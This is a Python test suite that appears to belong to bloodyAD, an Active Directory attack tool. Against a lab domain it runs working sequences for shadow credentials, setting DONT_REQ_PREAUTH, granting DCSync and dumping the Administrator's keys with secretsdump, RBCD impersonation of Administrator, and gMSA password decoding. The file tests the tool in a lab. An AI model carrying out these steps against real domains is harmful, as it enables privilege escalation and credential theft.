import unittest, subprocess, pathlib, json, hashlib, os, re, binascii


class TestModules(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        conf = json.loads((pathlib.Path(__file__).parent / "secrets.json").read_text())
        cls.domain = conf["domain"]
        cls.rootDomainNamingContext = ",".join(
            ["DC=" + subdomain for subdomain in cls.domain.split(".")]
        )
        cls.host = conf["pdc"]["ip"]
        cls.admin = {
            "username": conf["admin_user"]["username"],
            "password": conf["admin_user"]["password"],
        }
        cls.pkinit_path = conf["pkinit_path"]
        cls.toTear = []
        cls.env = os.environ.copy()
        cls.bloody_prefix = [
            "python3",
            "bloodyAD.py",
            "--host",
            cls.host,
            "-d",
            cls.domain,
        ]
        cls.user = {"username": "stan.dard", "password": "Password123!"}

    def test_01AuthCreateUser(self):
        # Add User
        self.createUser(self.admin, self.user["username"], self.user["password"])
        username_pass = ["-u", self.user["username"], "-p"]

        cleartext = username_pass + [self.admin["password"]]
        ntlm = username_pass + [
            f":{hashlib.new('md4',self.admin['password'].encode('utf-16le')).hexdigest()}"
        ]

        self.launchProcess(
            [
                "getTGT.py",
                "-dc-ip",
                self.host,
                f"{self.domain}/{self.admin['username']}:{self.admin['password']}",
            ]
        )
        self.env["KRB5CCNAME"] = f"{self.admin['username']}.ccache"
        krb = ["-k"]

        cert = ["-c", ":Administrator.pem"]

        auths = [cleartext, ntlm, krb, cert]
        for auth in auths:
            for sec_state in ["", "-s "]:
                self.launchProcess(
                    self.bloody_prefix
                    + auth
                    + (
                        sec_state + "getObjectAttributes Administrator sAMAccountName"
                    ).split(" ")
                )

    def test_02SearchAndGetChild(self):
        self.launchBloody(
            self.user,
            ["getChildObjects", "OU=Domain Controllers,DC=bloody,DC=local"],
        )
        self.launchBloody(
            self.user,
            [
                "search",
                self.rootDomainNamingContext,
                "(cn=Administrator)",
                "description",
            ],
        )

    def test_03UacOwnerGenericShadowGroupPasswordDCSync(self):
        slave = {"username": "slave", "password": "Password123!"}
        # Tries another OU
        ou = "CN=FOREIGNSECURITYPRINCIPALS," + self.rootDomainNamingContext
        self.createUser(self.admin, slave["username"], slave["password"], ou=ou)
        self.launchBloody(
            slave,
            [
                "getObjectAttributes",
                f"CN={slave['username']},{ou}",
                "distinguishedName",
            ],
        )

        # SetGenericAll
        self.launchBloody(
            self.admin,
            ["setGenericAll", self.user["username"], slave["username"]],
        )
        self.toTear.append(
            (
                self.removeGenericAll,
                self.user,
                self.user["username"],
                slave["username"],
            )
        )

        # SetUAC
        self.launchBloody(
            self.user, ["setUserAccountControl", slave["username"], "0x400000"]
        )
        self.assertRegex(
            self.launchBloody(
                self.user,
                [
                    "getObjectAttributes",
                    slave["username"],
                    "UserAccountControl",
                ],
            ),
            "DONT_REQ_PREAUTH",
        )
        self.launchBloody(
            self.user,
            ["setUserAccountControl", slave["username"], "0x400000", "False"],
        )

        # SetOwner
        self.launchBloody(
            self.user, ["setOwner", self.user["username"], slave["username"]]
        )
        self.assertRegex(
            self.launchBloody(
                self.user,
                [
                    "getObjectAttributes",
                    slave["username"],
                    "ntSecurityDescriptor",
                    "True",
                ],
                doPrint=False,
            ),
            f'"Owner": "{self.user["username"]}',
        )

        # Shadow
        outfile1 = "shado_cred"
        out_shado1 = self.launchBloody(
            self.user,
            ["setShadowCredentials", slave["username"], "True", outfile1],
        )
        outfile2 = "shado_cred2"
        self.launchBloody(
            self.user,
            ["setShadowCredentials", slave["username"], "True", outfile2],
        )
        id_shado1 = re.search("sha256 of RSA key: (.+)", out_shado1).group(1)
        self.pkinit(slave["username"], outfile1)
        self.launchBloody(
            self.user,
            [
                "setShadowCredentials",
                slave["username"],
                "False",
                "None",
                id_shado1,
            ],
        )
        self.pkinit(slave["username"], outfile2)
        self.launchBloody(
            self.user, ["setShadowCredentials", slave["username"], "False"]
        )

        # Group
        self.launchBloody(
            self.admin, ["setGenericAll", self.user["username"], "IIS_IUSRS"]
        )
        self.launchBloody(
            self.user, ["addObjectToGroup", slave["username"], "IIS_IUSRS"]
        )
        self.launchBloody(
            self.user, ["delObjectFromGroup", slave["username"], "IIS_IUSRS"]
        )

        # Password
        self.launchBloody(
            self.user, ["changePassword", slave["username"], "Password124!"]
        )
        self.launchBloody(
            self.user, ["changePassword", slave["username"], slave["password"]]
        )

        # DCsync
        self.launchBloody(
            self.admin,
            [
                "setGenericAll",
                self.user["username"],
                self.rootDomainNamingContext,
            ],
        )
        self.launchBloody(self.user, ["setDCSync", slave["username"]])
        self.assertRegex(
            self.launchProcess(
                [
                    "secretsdump.py",
                    "-just-dc-user",
                    "Administrator",
                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
                ]
            ),
            "Kerberos keys grabbed",
        )
        self.launchBloody(self.user, ["setDCSync", slave["username"], "False"])
        self.assertNotRegex(
            self.launchProcess(
                [
                    "secretsdump.py",
                    "-just-dc-user",
                    "Administrator",
                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
                ]
            ),
            "Kerberos keys grabbed",
        )
        self.launchBloody(
            self.admin,
            [
                "setGenericAll",
                self.user["username"],
                self.rootDomainNamingContext,
                "False",
            ],
        )

    def test_04ComputerRbcdGetSetAttribute(self):
        hostname = "test_pc"
        self.launchBloody(
            self.user,
            [
                "addComputer",
                hostname,
                "Password123!",
                "CN=COMPUTERS," + self.rootDomainNamingContext,
            ],
        )
        self.toTear.append(
            (self.launchBloody, self.admin, ["delObject", hostname + "$"])
        )

        hostname2 = "test_pc2"
        self.launchBloody(self.user, ["addComputer", hostname2, "Password123!"])
        self.toTear.append(
            (self.launchBloody, self.admin, ["delObject", hostname2 + "$"])
        )
        self.launchBloody(self.user, ["setRbcd", hostname2 + "$", hostname + "$"])

        hostname3 = "test_pc3"
        self.launchBloody(self.user, ["addComputer", hostname3, "Password123!"])
        self.toTear.append(
            (self.launchBloody, self.admin, ["delObject", hostname3 + "$"])
        )
        self.launchBloody(self.user, ["setRbcd", hostname3 + "$", hostname + "$"])

        # Test if rbcd correctly removed and doesn't remove all rbcd rights
        self.launchBloody(
            self.user, ["setRbcd", hostname3 + "$", hostname + "$", "False"]
        )
        self.assertNotRegex(
            self.launchBloody(
                self.user,
                [
                    "getObjectAttributes",
                    hostname + "$",
                    "msDS-AllowedToActOnBehalfOfOtherIdentity",
                    "True",
                ],
            ),
            hostname3 + "$",
        )

        del self.env["KRB5CCNAME"]
        self.assertRegex(
            self.launchProcess(
                [
                    "getST.py",
                    "-spn",
                    f"HOST/{hostname}",
                    "-impersonate",
                    "Administrator",
                    "-dc-ip",
                    self.host,
                    f"{self.domain}/{hostname2}$:Password123!",
                ],
                False,
            ),
            "Saving ticket in",
        )

        # SetAttr
        self.launchBloody(
            self.admin,
            ["setGenericAll", self.user["username"], hostname + "$"],
        )
        self.launchBloody(
            self.user,
            [
                "setAttribute",
                hostname + "$",
                "servicePrincipalName",
                '["TOTO/my.local.domain","TATA/imaginary.unicorn"]',
            ],
        )

    def test_05ComputerRbcdGetSetAttribute(self):
        managedPassword_raw = "01000000240200001000120114021c024dafdec827d690c71f64bd4d88a8351d23bdfa8eca206fc57d63450908c698f46a4902523d11614839b95e522c59bc78ae43ee869c25678052f4eca85010842b9c0e2e3c1d462cd839eaa83709e01452171218577e68cad4de9576c4a94b47da96f6a56c15bfa1a0a02769e6663c6bef47601d3079e3514d0a01e642a33c9bf4d5266e355d4511f421359d767355b8557363653d3adfe7b6950c1e443171c8b1b55249421bc1379e94abefcdd955ed2f1d6689f1b1095ef6e73fdbc853c4fe9c5dd3e0dc5ff51989ed2770d06b28f8cd2b92a61721e002b636e1eef1a53488b168af5b97081e3b75a4393a4b2ff614e3ae5ebeddde044bad2c5afe65b257f63a0000d22a8a7805c89cf00f66f3751c5167fa9066161ed146cb100465b56b5cb8719fc3b4ff5c0dc4f552824562eb7de0564bf1e2a2f542ed69a0de456dfdffcad0127ba1c3e9466ea8947737271cac6390167a590c2b6de8e72fe9d2b7d65a39f7419d29f8f248e988cc58a2451df60fa3d585c8828ff873fa19b07efea628a42a53b3e8cc8796035976760456d464a2ea817e14afd04a1e8ec0ec50df80381dbc1e3385297b0034f3a883b5ca5e515d21241b4e2c00bcf62c05ca52a58494fec4f0c7a06ebcfd865879a0bc57567fd3035d8207b2227c8c42fe5550dc96605726cb9c7c8acdfb638e57402e741d563aea4f7ff702416287a5903f379ca0c4eaa37c0000143b80910310000014ddafde02100000"
        managedPassword_nthash = "95f2a1e85bae294a9a3d8b32dffee725"

        managedPassword_raw = binascii.unhexlify(managedPassword_raw.encode())
        from bloodyAD.formatters.cryptography import MSDS_MANAGEDPASSWORD_BLOB

        managedPassword_blob = MSDS_MANAGEDPASSWORD_BLOB(managedPassword_raw)
        self.assertEqual(managedPassword_blob.getData(), managedPassword_raw)
        self.assertEqual(managedPassword_blob.toNtHash(), managedPassword_nthash)

    def createUser(self, creds, usr, pwd, ou=None):
        args = ["addUser", usr, pwd]
        if ou:
            args += [ou]
        self.launchBloody(creds, args)
        self.toTear.append((self.launchBloody, creds, ["delObject", usr]))

    def removeGenericAll(self, creds, identity, target):
        self.launchBloody(creds, ["setGenericAll", identity, target, "False"])
        self.assertNotRegex(
            self.launchBloody(
                creds,
                [
                    "getObjectAttributes",
                    target,
                    "ntSecurityDescriptor",
                    "True",
                ],
                doPrint=False,
            ),
            '"Trustee": "' + identity,
        )

    def pkinit(self, username, outfile):
        self.assertRegex(
            self.launchProcess(
                [
                    "python3",
                    f"{self.pkinit_path}/gettgtpkinit.py",
                    "-dc-ip",
                    self.host,
                    "-cert-pem",
                    f"{outfile}_cert.pem",
                    "-key-pem",
                    f"{outfile}_priv.pem",
                    f"{self.domain}/{username}",
                    f"{outfile}.ccache",
                ],
                False,
            ),
            "Saved TGT to file",
        )
        for name in [
            f"{outfile}_cert.pem",
            f"{outfile}_priv.pem",
            f"{outfile}.ccache",
        ]:
            self.toTear.append([(pathlib.Path() / name).unlink])

    @classmethod
    def tearDownClass(cls):
        while len(cls.toTear):
            func = cls.toTear.pop()
            if len(func) > 1:
                func[0](*func[1:])
            else:
                func[0]()

    def launchBloody(self, creds, args, isErr=True, doPrint=True):
        cmd_creds = ["-u", creds["username"], "-p", creds["password"]]
        return self.launchProcess(self.bloody_prefix + cmd_creds + args, isErr, doPrint)

    def launchProcess(self, cmd, isErr=True, doPrint=True):
        out, err = subprocess.Popen(
            cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE, env=self.env
        ).communicate()
        out = out.decode()
        if isErr:
            self.assertTrue(out, self.printErr(err.decode(), cmd))
        else:
            out += "\n" + err.decode()
        if doPrint:
            print(out)
        return out

    def printErr(self, err, cmd):
        err = err.replace("\n", "\n ")
        self.err = f"here is the error output ->\n\n {cmd}\n{err}"
        return self.err


if __name__ == "__main__":
    unittest.main(failfast=True)
